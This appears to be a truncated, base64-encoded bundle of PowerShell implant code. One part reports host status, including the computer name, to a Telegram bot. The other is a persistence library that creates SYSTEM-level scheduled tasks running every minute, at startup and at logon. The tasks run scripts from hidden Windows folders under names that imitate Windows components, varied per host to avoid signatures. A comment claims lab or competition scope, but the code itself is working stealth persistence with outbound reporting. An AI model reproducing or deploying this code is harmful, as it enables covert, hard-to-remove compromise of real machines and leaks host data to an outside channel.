ZXQtU3ZjTGluZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKDk5MDgxOThlNjY4ZTQ3NTApJwogICAg
JGdyeXhhU2hvcnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
bHNlIHsgJy0nIH0KICAgICR0ZXh0ID0gIiRlbW9qaSBTQ0R8JCgkZW52OkNPTVBVVEVSTkFNRSl8
c2V2PSRwcmltU2hvcnR8Z3J5PSRncnl4YVNob3J0fGFsdD0kYWx0U2hvcnR8Zj0kZm9yZWlnbk58
dD0kdGFza09rLzV8Yj0kQnVpbGQiCn0KCmlmICgkdGV4dC5MZW5ndGggLWd0IDM4MDApIHsKICAg
ICRybW1IaXRzID0gQCgoJHJtbUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxMikpICsgKCct
IC4uLiAoezB9IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpCiAgICAkc2NMaXN0ID0g
QCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0gLi4uICh7MH0gbW9y
ZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQogICAgJHRleHQgPSAkdGV4dC5TdWJzdHJpbmco
MCwgMzgwMCkgKyAiYG5gbjxpPlRSVU5DQVRFRCAoVGVsZWdyYW0gNDA5NiBsaW1pdCk8L2k+Igp9
CgokbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicKZnVuY3Rpb24gU2VuZC1UZyhb
c3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsKICAgICRwYXlsb2FkID0gQHsKICAgICAgICBj
aGF0X2lkICAgICAgICAgICAgICAgICAgPSAkY2ZnLkNIQVRfSUQKICAgICAgICB0ZXh0ICAgICAg
ICAgICAgICAgICAgICAgPSAkbXNnCiAgICAgICAgZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0g
JHRydWUKICAgIH0KICAgIGlmICgkbW9kZSkgeyAkcGF5bG9hZC5wYXJzZV9tb2RlID0gJG1vZGUg
fQogICAgJGpzb24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
NQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkanNv
bikKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcv
Ym90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3NhZ2UiKSBgCiAgICAgICAgLU1ldGhvZCBQb3N0
IC1Cb2R5ICRieXRlcyAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRm
LTgnIHwgT3V0LU51bGwKfQoKZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBbc3Ry
aW5nXSRtb2RlKSB7CiAgICAkdG9TZW5kID0gJG1zZwogICAgdHJ5IHsKICAgICAgICBTZW5kLVRn
IC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQogICAgICAgIHJldHVybiAkdHJ1ZQogICAgfSBjYXRj
aCB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgU2VuZC1UZyAtbXNnICgkdG9TZW5kLlN1YnN0
cmluZygwLCAzMDAwKSArICJgbjxpPlRSVU5DQVRFRDwvaT4iKSAtbW9kZSAkbW9kZQogICAgICAg
ICAgICByZXR1cm4gJHRydWUKICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgcmV0dXJuICRm
YWxzZQogICAgICAgIH0KICAgIH0KfQoKdHJ5IHsKICAgIGlmIChTZW5kLVRnU2FmZSAtbXNnICR0
ZXh0IC1tb2RlICdIVE1MJykgewogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAndGdfc2VudF9yaWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAg
fSBlbHNlIHsKICAgICAgICB0aHJvdyAnaHRtbF9mYWlsZWQnCiAgICB9CiAgICBpZiAoJGtleSAt
ZXEgJ0RFUExPWScpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFs
dWUgKCJ0Z19kZXBsb3lfb2s9IiArICRkZXBsb3lPaykgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUKICAgICAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0Rp
ciAnZGVwbG95X3RnLmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgfQp9IGNhdGNoIHsKICAgIHRyeSB7CiAgICAgICAg
JHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxbXj5dKz4nLCAnJykKICAgICAgICAk
cGxhaW4gPSBbU3lzdGVtLk5ldC5XZWJVdGlsaXR5XTo6SHRtbERlY29kZSgkcGxhaW4pCiAgICAg
ICAgaWYgKCRwbGFpbi5MZW5ndGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0cmlu
ZygwLCAzNTAwKSArICJgblRSVU5DQVRFRCIgfQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cgJHBs
YWluIC1tb2RlICcnIHwgT3V0LU51bGwKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGgg
JGxvZyAtVmFsdWUgJ3RnX3NlbnRfcGxhaW4nIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
CiAgICB9IGNhdGNoIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFs
dWUgKCJ0Z19mYWlsICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIH0KfQo=
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE0CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTM6IHNjaHRhc2tzIENy
ZWF0ZSB2aWEgY21kIChsaWtlIFd1Y2FjaGVPd24pLCBUUiB1bmRlciBXaW5kb3dzXFRlbXBcLnd1
Y2FjaGUKIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwgL1NUIDAwOjAw
IG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLgojIEwxMjogSURFTlRWRVI9NyBST09ULWxldmVsIHRh
c2sgbmFtZXMgKG5lc3RlZCBNaWNyb3NvZnRcV2luZG93cyBBY2Nlc3MgRGVuaWVkKS4KIyBMMTE6
IE5FVkVSIHJldXNlIHJlYWwgV2luZG93cyBidWlsdC1pbiB0YXNrIG5hbWVzOyBUUiBvd25lcnNo
aXAgY2hlY2tzLgojIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRp
dGlvbiBzY29wZSBvbmx5LgojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkApbQ21kbGV0QmluZGluZygpXQpw
YXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgW1ZhbGlkYXRlU2V0
KCdpbml0JywgJ3dhdGNoZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICd0YXNrcy1lbnN1cmUnLCAn
c3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3JlZ2lzdGVyZWQnLCAnZXh0ZXJtaW5hdGUn
KV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10k
TW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVpbGQgID0gJ08xNScsCiAgICBbc3RyaW5nXSRF
eHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAgICA9ICcnCikKCiRFcnJvckFjdGlvblByZWZl
cmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKJGNmZ1BhdGggPSBKb2luLVBhdGggJFdvcmtEaXIg
J2lkZW50aXR5LmNmZycKJElkZW50VmVyc2lvbiA9IDgKCiMgUm9vdC1sZXZlbCBuYW1lcyBXSVRI
T1VUIGxlYWRpbmcgYmFja3NsYXNoIChtYXRjaGVzIHdvcmtpbmcgV3VjYWNoZU93biBzdHlsZSku
CiRQb29scyA9IEB7CiAgICBBID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RDYWNoZScsJ05l
dFRyYWNlQ2FjaGUnLCdXZGlIb3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFsdGgnLCdUY3BJcENvbmZs
aWN0UmVzJywnU3JDYWNoZVN5bmMnLCdSZXNvbHV0aW9uUXVldWUnKQogICAgQiA9IEAoJ1BsYVNl
cnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRyYWNlQ2FjaGUn
LCdEaWFnSG9zdENhY2hlJywnVGNwSXBDb25mbGljdFJlcycsJ1BsYVNlcnZlckRpYWcnLCdTckNh
Y2hlU3luYycpCiAgICBDID0gQCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1Rj
cElwQ29uZmxpY3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9z
dENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpCiAgICBEID0gQCgnVGNwSXBD
b25mbGljdFJlcycsJ1Jlc29sdXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENh
Y2hlJywnUGxhU2VydmVyRGlhZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dk
aUhvc3RQcm94eScpCn0KJERlZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tfQSA9ICdXZXJR
dWV1ZVN5bmMnCiAgICBUQVNLX0IgPSAnUGxhU2VydmVySGVhbHRoJwogICAgVEFTS19DID0gJ1dk
aUhvc3RQcm94eScKICAgIFRBU0tfRCA9ICdUY3BJcENvbmZsaWN0UmVzJwogICAgTU9fQSAgID0g
JzInCiAgICBNT19CICAgPSAnMycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0g
MEwKICAgIGZvcmVhY2ggKCRjIGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJB
cnJheSgpKSB7ICRzID0gKCRzICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0
dXJuICRzCn0KCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNs
b25lKCkKICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGlu
ZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAg
ICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7
ICRpZFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0
dXJuICRpZAp9CgpmdW5jdGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBp
ZiAoJHRuKSB7ICYgc2NodGFza3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51
bGwgfQp9CgpmdW5jdGlvbiBHZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7CiAgICBp
ZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVl
cnkgL1ROICR0biAvRk8gTElTVCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUg
MCAtb3IgLW5vdCAkb3V0KSB7IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0IHwgRm9yRWFj
aC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3QtVGFza093bnNN
b24oW3N0cmluZ10kdG4sIFtzdHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9ubHkgaWYgdGhl
IHNjaGVkdWxlZCBhY3Rpb24gcG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCUIG5vdCBhIFdp
bmRvd3MgQ09NIGhhbmRsZXIuCiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAg
ICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFya2VyIC1hbmQg
KCRibG9iIC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1ZSB9
CiAgICBpZiAoJGJsb2IgLW1hdGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9t
b25cLmNtZHxcLmV0bGNhY2hlXFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1cm4gJGZhbHNl
Cn0KCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90ZW50IHdpdGhp
biBhbiBJREVOVFZFUiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6CiAg
ICAjIG93bmVkIG9sZC1uYW1lIHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3
aXRoIHNhbWUgbmFtZSBhcmUgbGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgp
IHsKICAgICAgICAkb2xkID0gUmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFsc28gcmVnZW5l
cmF0ZSBpZiBhbnkgVEFTS18qIGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBidWdzIGxlZnQg
Ymxhbmsgc2xvdHMpCiAgICAgICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJ
ZGVudFZlcnNpb24iKSAtYW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFu
ZCAkb2xkWydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYgKCRzbG90c09r
KSB7IHJldHVybiAkb2xkIH0KICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19C
JywnVEFTS19DJywnVEFTS19EJykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtd
CiAgICAgICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICMgTmV2
ZXIgZGVsZXRlIGEgcmVhbCBXaW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9j
dXN0b20gaGFuZGxlcikuCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykg
eyBSZW1vdmUtVGFza1F1aWV0ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1JdGVtIC1M
aXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAg
ICAjIEw0OiB0d28gc2xvdHMgbWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBz
aGFyZSBuYW1lcykgLT4KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3
YXJkIHVudGlsIHRoZSBwaWNrIGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUg
b2xkIEAoQCgnQScsICRzICUgOCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1
LjE6CiAgICAjIGJhcmUgJSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3Qg
YWxpYXMgKG5vdCBtb2R1bG8pLCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5k
IHRoZSBsb29wIG5ldmVyIHJhbiAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tf
KiBhbmQgdGhlIHdob2xlIGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNr
IG5hbWVzLgogICAgJHNlZWRzID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAg
ICAgICBCID0gKCgkcyArIDMpICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAg
ICBEID0gKCgkcyArIDcpICUgOCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBm
b3JlYWNoICgkbGV0dGVyIGluICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0k
c2VlZHNbJGxldHRlcl0KICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAg
ICAkbiA9IDAKICAgICAgICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5k
ICRuIC1sdCA4KSB7ICRpID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVsk
aV07ICRuKysgfQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJU
QVNLXyRsZXR0ZXIiXSB9CiAgICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAg
JGNmZyA9IEAoCiAgICAgICAgIlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgk
cGljay5CKSIKICAgICAgICAiVEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRw
aWNrLkQpIgogICAgICAgICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWlu
IGppdHRlcgogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWlu
IGppdHRlcgogICAgICAgICJTRUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9u
IgogICAgKQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2Zn
IC1Gb3JjZQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBOb3JtYWxpemUt
VGFza05hbWUoW3N0cmluZ10kdG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQog
ICAgcmV0dXJuICR0bi5UcmltKCkuVHJpbVN0YXJ0KCdcJykKfQoKZnVuY3Rpb24gV3JpdGUtT3du
TG9nKFtzdHJpbmddJG0pIHsKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJy
JwogICAgdHJ5IHsgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3Jj
ZSB9IGNhdGNoIHt9Cn0KCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3MgewogICAgIyBNaXJy
b3Igd29ya2luZyBkZXRhY2ggKFd1Y2FjaGVPd24pOiBjbWQgc2NodGFza3MsIEJPT1QgVFIgcGF0
aCwgL1NUIG9uIE1JTlVURS4KICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkKICAgIGlmICgt
bm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNt
ZCcgfQogICAgJGJvb3QgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdUZW1wXC53dWNhY2hl
JwogICAgJGV0bERpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRl
XC5ldGxjYWNoZScKICAgIGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIpKSB7CiAgICAg
ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1JdGVtIC1JdGVt
VHlwZSBEaXJlY3RvcnkgLVBhdGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQogICAgfQogICAgJGJv
b3RNb24gPSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJwogICAgJGJvb3RFdGwgPSBKb2lu
LVBhdGggJGJvb3QgJ2V0bF9tb24uY21kJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRsRGly
ICdldGxfbW9uLmNtZCcKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNb25QYXRoKSB7
CiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJv
b3RNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1J
dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwgLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0
aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIH0KICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5IG93bl9zZWN1
cmUg4oCUIFRhc2sgU2NoZWR1bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLgogICAgJHRyTW9uID0g
ImNtZC5leGUgL2MgJGJvb3RNb24iCiAgICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCIK
ICAgICRtb0EgPSBbc3RyaW5nXSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9BKSB7ICRtb0EgPSAn
MicgfQogICAgJG1vQiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1v
QiA9ICczJyB9CiAgICAkc3QgPSAoR2V0LURhdGUpLlRvU3RyaW5nKCdISDptbScpCiAgICAkc3Bl
Y3MgPSBAKAogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQn
OyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRyID0gJHRyTW9uIH0KICAgICAgICBAeyBLZXkg
PSAnVEFTS19CJzsgTWFya2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAk
bW9COyBUciA9ICR0ckV0bCB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1hcmtlciA9ICdv
d25fbW9uLmNtZCc7IFNjID0gJ09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICAg
ICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9H
T04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICApCiAgICAkb2sgPSAwOyAkcmVhcm1lZCA9
IDA7ICRmYWlsID0gMAogICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAgICAgICR0biA9
IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJHNwLktleV0pCiAgICAgICAgaWYgKC1u
b3QgJHRuKSB7ICRmYWlsKys7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01v
biAkdG4gJHNwLk1hcmtlcikgeyAkb2srKzsgY29udGludWUgfQogICAgICAgIGlmIChUZXN0LVRh
c2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAg
ICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICAgICAgaWYgKC1ub3QgJGJsb2Ip
IHsgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICgiXCR0biIpIH0KICAgICAgICBpZiAoJGJs
b2IpIHsKICAgICAgICAgICAgJG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21v
blwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgICAgICAg
ICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRhc2tzX3Nr
aXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQg
JHRuCiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgKCJcJHRuIikKICAgICAgICB9CiAgICAg
ICAgIyBCdWlsZCBjbWRsaW5lIGV4YWN0bHkgbGlrZSBvd24uY21kIGRldGFjaCAocHJvdmVuIHRv
IHdvcmsgYXMgU1lTVEVNKS4KICAgICAgICAkcGFydHMgPSBAKAogICAgICAgICAgICAnL0NyZWF0
ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNUJywgJy9GJywK
ICAgICAgICAgICAgJy9UUicsICRzcC5UciwgJy9TQycsICRzcC5TYwogICAgICAgICkKICAgICAg
ICBpZiAoJHNwLlNjIC1lcSAnTUlOVVRFJykgewogICAgICAgICAgICAkcGFydHMgKz0gQCgnL01P
JywgJHNwLk1vLCAnL1NUJywgJHN0KQogICAgICAgIH0KICAgICAgICAkYXJnTGluZSA9ICgkcGFy
dHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1tccyJdJykg
eyAnInswfSInIC1mICgkXyAtcmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRfIH0KICAgICAg
ICB9KSAtam9pbiAnICcKICAgICAgICAkY3JlYXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3Mu
ZXhlICRhcmdMaW5lIiAyPiYxIHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0KICAgICAgICAkY3Jl
YXRlSm9pbmVkID0gKCRjcmVhdGVUeHQgLWpvaW4gJyAnKS5UcmltKCkKICAgICAgICBXcml0ZS1P
d25Mb2cgInRhc2tzX2NyZWF0ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9pbmVkIgogICAg
ICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9yIChUZXN0LVRhc2tP
d25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpKSB7CiAgICAgICAgICAgICRyZWFybWVkKysKICAg
ICAgICAgICAgaWYgKCRzcC5LZXkgLWVxICdUQVNLX0EnIC1vciAkc3AuS2V5IC1lcSAnVEFTS19C
